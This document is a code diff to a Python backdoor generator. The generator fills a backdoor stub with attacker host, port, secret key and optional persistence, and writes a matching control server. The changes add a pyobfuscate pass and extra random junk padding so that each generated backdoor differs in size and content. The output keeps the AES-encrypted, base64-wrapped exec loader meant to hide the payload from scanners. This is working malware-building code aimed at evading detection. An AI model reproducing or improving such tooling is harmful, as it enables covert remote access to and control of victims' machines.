@@ -15,7 +15,7 @@
 ## more details.
 
 from Crypto.Cipher import AES
-import base64, random, string, sys, os, argparse
+import base64, random, string, sys, os, argparse, subprocess
 
 def randKey(bytes):
 	return ''.join(random.choice(string.ascii_letters + string.digits + "{}!@#$^&()*&[]|,./?") for x in range(bytes))
@@ -66,7 +66,9 @@ key, iv, secretkey = randKey(32), randKey(16), randKey(32)
 be64var, bd64var, AESvar = randVar(), randVar(), randVar()
 triplequote = "'" * 3
 lswinservices = triplequote + '''for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a''' + triplequote
-junk = randVar() + ' = "' + ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(random.randint(1,25000))) + '"'  # Add a random amount of random shit to make sure the size is always different.
+junk = randVar() + ' = "' + ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for x in range(random.randint(1,25000))) + '"'  # Add a random amount of random shit to make sure the size is always different.
+junk2 = randVar() + ' = "' + ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for x in range(random.randint(1,25000))) + '"'  # Add a random amount of random shit to make sure the size is always different.
+
 if args.persistence:
 	persistpart = '''
 	else:
@@ -84,13 +86,7 @@ with open('base64/64', 'rb') as exe64:
 	bypass64 = "bypass64exe = '%s'" % (exe64.read())
 
 with open('stubs/backdoor.py', 'rb') as finalbackdoor:
-	readyscript = finalbackdoor.read().replace('**n', '\\n').replace('***HOST***', hostname).replace('***PORT***', portnumber).replace('***SECRET***', secretkey).replace('**r', '\\r').replace('***PERSIST***', persistpart).replace('***AES***', AESvar).replace('***B64D***',bd64var).replace('***B64E***',be64var).replace('***PROXY***', proxysetting).replace('***WINSERVICES***', lswinservices).replace('***JUNK***', junk).replace('***64EXE***', bypass64).replace('***86EXE***', bypass86)
-
-f = open(backdoorName, 'w')
-cipherEnc = AES.new(key)
-encrypted = EncodeAES(cipherEnc, readyscript)
-f.write('''#!/usr/bin/env python
-import ''')
+	readyscript = finalbackdoor.read().replace('**n', '\\n').replace('***HOST***', hostname).replace('***PORT***', portnumber).replace('***SECRET***', secretkey).replace('**r', '\\r').replace('***PERSIST***', persistpart).replace('***AES***', AESvar).replace('***B64D***',bd64var).replace('***B64E***',be64var).replace('***PROXY***', proxysetting).replace('***WINSERVICES***', lswinservices).replace('***JUNK***', junk).replace('***64EXE***', bypass64).replace('***86EXE***', bypass86).replace('***JUNK2***', junk2)
 
 myimports = ['subprocess', 'platform', 'socket', 'os', 'struct', 'urllib2', 'binascii', 'ctypes', 'threading', 'string', 'sqlite3', 'requests']
 myendings = ['from Crypto import Random', 'from Crypto.Cipher import AES as %s' % (AESvar), 'from base64 import b64decode as %s' % (bd64var), 'from base64 import b64encode as %s' % (be64var)]
@@ -103,22 +99,31 @@ random.shuffle(myimports)
 random.shuffle(myendings)
 random.shuffle(mywindows)
 
-f.write(",".join(myimports) + "\n")
-f.write(";".join(myendings) + "\n")
-f.write('''try:
-	import ''')
-f.write(",".join(mywindows) + "\n")
-f.write('''except:
-	pass
-''')
-f.write("exec(%s(\"%s\"))" % (bd64var,base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" %(AESvar,key,bd64var,encrypted))))
-f.close()
+with open('tempobfs.py', 'wb') as o:
+	o.write(readyscript)
+
+obstime = subprocess.Popen('python pyobfuscate.py -s %s tempobfs.py' % (''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(25,80)))), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+readyscript = obstime.stdout.read()
+os.remove('tempobfs.py')
+
+cipher = AES.new(key)
+encrypted = EncodeAES(cipher, readyscript)
+
+with open(backdoorName, 'w') as f:
+	f.write('#!/usr/bin/env python\nimport ')
+	f.write(",".join(myimports) + "\n")
+	f.write(";".join(myendings) + "\n")
+	f.write('try:\n	import ')
+	f.write(",".join(mywindows) + "\n")
+	f.write('except:\n	pass\n')
+	f.write("exec(%s(\"%s\"))" % (bd64var,base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" %(AESvar,key,bd64var,encrypted))))
 
 with open('stubs/server.py', 'rb') as rawserv:
 	finalserver = rawserv.read().replace('**n', '\\n').replace('**r', '\\r').replace('***SECRET***', secretkey).replace('***PORT***', portnumber)
-se = open(serverName, 'wb')
-se.write(finalserver)
-se.close()
+
+with open(serverName, 'wb') as se:
+	se.write(finalserver)
+
 if os.name == 'posix':
 	os.system('chmod +x %s %s' % (backdoorName, serverName))
 print " [*] Backdoor written to %s\n [*] Server written to %s" % (backdoorName, serverName)
